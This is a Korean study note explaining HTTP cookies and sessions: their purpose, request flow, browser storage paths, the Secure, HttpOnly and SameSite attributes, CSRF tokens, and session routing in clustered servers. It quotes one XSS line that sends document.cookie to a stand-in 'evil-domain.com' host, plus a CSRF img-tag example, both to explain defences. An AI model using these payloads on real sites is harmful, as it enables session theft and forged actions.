# Cookie와 Session

**updated 2023.04.08**

## 정의

### 쿠키와 세션

- 공통적으로 비상태성, 비연결성을 지향하는 HTTP 통신에서 서버-클라이언트간 유지해야하는 정보를 저장하기 위해 사용하는 기술이다.

- 쿠키는 클라이언트에 저장되고
- 세션은 서버에 저장되는 것이 큰 차이점이다.

## 쿠키

#### 쿠키의 목적

- 세션 관리(세션 관리)
  서버에 저장해야 할 로그인, 카트, 게임 경축 등의 정보 관리

- 개인화(Personalization)
  사용자 선호, 테마 등의 셋팅

- 트래킹(Tracking)
  사용자 행동을 기록하고 분석하는 용도

#### 쿠키 특징

1. 이름, 값, 만료일(저장 기간 설정), 경로 정보로 구성되어 있다.
2. 하나의 쿠키는 4KB(=4096byte)까지 저장 가능하다.

#### 쿠키의 동작 순서

1. 클라이언트가 페이지를 요청한다. (사용자가 웹사이트 접근)
2. 웹 서버는 응답과 함께 쿠키를 저장하라고 정보를 전달한다.
   ```
   HTTP/1.0 200 OK
   Content-type: text/html
   Set-Cookie: yummy_cookie=choco
   Set-Cookie: tasty_cookie=strawberry
   ```
3. 클라이언트는 응답을 받으면서 요청서대로 쿠키를 생성하고 로컬에 저장한다.
4. 이후 클라이언트는 다시 서버에 요청할 때 요청과 함께 쿠키를 전송한다.
5. 동일 사이트 재방문시 클라이언트의 PC에 해당 쿠키가 있는 경우,
   요청 페이지와 함께 쿠키를 전송한다.

### 쿠키는 디스크에 저장이 되는지? 메모리에 저장이 되는지?

답 : 디스크에 저장된다.

단,

- 웹브라우저 종류에 따라 쿠키가 저장되는 위치기 달라진다.

  - Google Chrome 쿠키는 물리적 위치는 C:\Users\<yourusername>\AppData\Local\Google\Chrome\User Data\Default\Local 저장소이지만 인터넷 캐시를 제외한 다른 쿠키는 SQLite 데이터베이스 파일로 인코딩된다.

  - Internet Explorer 쿠키는 C:\Users\<yourusername>\AppData\Roaming\Microsoft\Windows\Cookies에 있다.

  - Firefox의 경우
    C:\Documents 또는 Settings\username\Application Data\Mozilla\Firefox\Profiles\xxxx.default
    - 파일은 FF 버전에 따라 SQLLite 데이터베이스로 인코딩될 수 있다.

참고 : [답변 링크](https://www.quora.com/Where-on-my-machine-are-the-cookies-saved)

### 쿠키 보안 방법

MDN에서는 기본적으로

> 기밀 혹은 민감한 정보는 전체 메커니즘이 본질적으로 위험하기 때문에 HTTP 쿠키 내에 저장되거나 전송되어서는 안된다

고 권고 하고있긴 하다. 그래도 아래 설정을 통해 쿠키 보안을 강화 할 수 있다.

- Secure 설정 : HTTPS 프로토콜이 부과된(encrypted) 요청일 경우에만 전송된다.
- HttpOnly 설정 : JavaScript의 Document.cookieAPI에 접근할 수 없도록 한다. 이 설정이 된 쿠키는 스크립트로 접근 및 변경이 불가하고, 생성된 내용그대로 서버에게 전송되기만 한다.

  - 세션 하이재킹과 XSS 취약점 보완에 도움이 된다.
    ```
    (new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
    ```
    HttpOnly 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있다.

- 도메인과 패스 설정 : 특정 도메인과 패스에만 해당 쿠키를 전송한다.

- SameSite 설정 : 아직 실험중인 기능이지만, 쿠키가 cross-site 요청과 함께 전송되지 않았음을 요구하게 만들어, cross-site 요청 위조 공격([CSRF (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/CSRF))에 대해 어떤 보호 방법을 제공한다.

  ```
  <img src="https://www.example.com/index.php?action=delete&id=123" />

  ```

  예를 들어, 수정 권한이 있는 사용자의 경우 https://www.example.com요소 가 에 있지 않더라도 요소는 사용자 모르게 <img>에서 작업을 실행하여, 링크 뒤의 URL 에 악성 매개변수를 포함하여 이를 수행할 수 있다.

  - 더 읽어보기 : [교차 사이트 요청 위변조 방지 치트 시트](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation)

  - 추가로 Spring Security 3.2.0 이후부터는 CSRF 방어 기능을 위해 CSRF토큰을 자동으로 사용한다고 한다.

    - CSRF Token은 임의의 난수를 생성하고 세션에 저장한다.
    - 그리고 사용자의 매 요청마다 해당 난수 값을 포함시켜서 전송시킨다.
    - 이후 백엔드에서는 요청을 받을 때 마다 세션에 저장된 토큰값과 요청 파라미터에 전달된 토큰 값이 같은지 검사한다.

  - 참고 [CSRFCross-site-request-forgery-공격과-토큰-로그인-처리-로그아웃-처리](https://lifere.tistory.com/entry/CSRFCross-site-request-forgery-%EA%B3%B5%EA%B2%A9%EA%B3%BC-%ED%86%A0%ED%81%B0-%EB%A1%9C%EA%B7%B8%EC%9D%B8-%EC%B2%98%EB%A6%AC-%EB%A1%9C%EA%B7%B8%EC%95%84%EC%9B%83-%EC%B2%98)

## 세션

- 세션이 만들어지는 과정
  1. 클라이언트가 페이지를 요청한다. (사용자가 웹사이트 접근)
  2. 서버는 접근한 클라이언트의 Request-Header 필드인 Cookie를 확인하여,
     클라이언트가 해당 session-id를 보냈는지 확인한다.
  3. session-id가 존재하지 않는다면,
     서버는 session-id를 생성해 클라이언트에게 돌려준다.
  4. 서버에서 클라이언트로 돌려준 session-id를 쿠키를 사용해 서버에 저장한다.
     쿠키 이름 : JSESSIONID
  5. 클라이언트는 재접속 시,
     이 쿠키(JSESSIONID)를 이용하여 session-id 값을 서버에 전달

### 세션 트래킹 모드란?

> 세션 트래킹(Session Tracking)은 좁은 의미로 요청된 세션을 찾아 주는 동작이다. 클러스터링 환경에서 세션 트래킹의 지원 범위(Scope)에 따라 라우팅(Routing)에 의한 세션 트래킹과 세션 서버(Session Server)를 통한 세션 트래킹으로 구분된다.

참고 문서 : [제1장 세션 트래킹(Session Tracking)](https://technet.tmaxsoft.com/upload/download/online/jeus/pver-20140827-000001/session/chapter_session_tracking.html)

<img src="https://technet.tmaxsoft.com/upload/download/online/jeus/pver-20140827-000001/session/resources/session-tracking/05_without_session_routing_client_session_is_lost_in_a_clustered_environment.png"/>

1. 클라이언트 A가 웹서버 A에 첫 통신후 세션을 생성한 상태이다.
2. 클러스트 환경(동일한 기능을 하는 웹서버 A와 B)에서 클라이언트 A가 두번째 요청을 보냈을 때, 이 요청은 항상 웹서버 A에게 간다는 보장이 없다. 만약 B에게 이 요청이 가면
   > 웹 엔진 B는 요청과 세션 쿠키를 받는다. 자신의 메모리 영역에서 쿠키에 대응하는 HTTP 세션을 가져오려고 시도하지만 대응하는 HTTP 세션 객체가 없기 때문에 가져올 수 없다.
   > 따라서 웹 엔진 B는 클라이언트 세션을 유지할 수 없고 새로운 세션을 강제로 생성하거나 또는 오류 메시지를 반환한다(물론 두 옵션 모두 권장하지 않는다).

이러한 문제를 해결하는 방법은 크게 2가지가 있다.

- 라우팅으로 처리
  <img src="https://technet.tmaxsoft.com/upload/download/online/jeus/pver-20140827-000001/session/resources/session-tracking/07_session_routing_in_action.png"/>

  - 세션 라우팅은 클러스터된 환경에서 해당 세션에 자신이 생성 또는 저장된 엔진의 ID를 부여하는 기능을 의미한다.
  - 해당 엔진 ID가 쿠키에 포함되어 있기 때문에 웹 서버에서는 해당 엔진 ID를 확인하여 요청을 할 수 있다.
  - 그로 인해 웹 엔진의 메모리에 저장되어 있는 세션의 효율을 증가시킬 수 있다.

- 세션 서버로 처리
  <img src="https://technet.tmaxsoft.com/upload/download/online/jeus/pver-20140827-000001/session/resources/session-tracking/09_storing_session_data_and_session_id_in_a_separate_session_server.png"/>

  - 세션 서버는 위 그림과 같이 공용 저장소의 역할을 수행한다. 웹 엔진 A, 웹 엔진 B는 각각 별도의 저장 매체이며 서로의 내용을 참조할 수 없게 구성되어 있다. 그러나 세션 서버를 마치 둘의 공용 저장소처럼 두고 세션에 대한 정보를 저장하고, 또 불러오도록 하여 세션의 공유를 돕는다.

  - 세션 서버를 사용할 때에는 모든 웹 엔진이 클러스터 내의 모든 웹 서버에 연결될 필요는 없다. 또한 세션 서버는 클러스터 내의 모든 세션 데이터에 대해 신뢰적인 백업 기능을 제공한다. 따라서 특정 웹 엔진에 장애가 발생해도 세션 데이터는 저장되고, 다른 정상적인 웹 엔진이 장애가 발생한 웹 엔진의 요청을 대신 처리한다.
